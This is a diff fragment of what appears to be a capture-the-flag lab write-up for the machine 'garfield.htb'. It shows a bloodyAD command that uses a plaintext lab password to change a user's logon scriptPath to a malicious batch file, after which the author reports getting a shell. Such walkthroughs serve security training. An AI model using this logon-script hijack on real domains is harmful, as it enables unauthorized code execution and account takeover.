@@ -252,4 +252,16 @@ smb: \garfield.htb\scripts\> dir
 smb: \garfield.htb\scripts\>
 ```
 
-T
+Then ill upload it to the location of the login scripts
+
+```python
+❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object 'l.wilson' scriptPath -v 'script.bat'                   
+[+] l.wilson's scriptPath has been updated
+```
+
+Then ill set the new script path to the malicious file
+
+![](Pasted%20image%2020261109190252.png)
+
+I now have a shell!
+
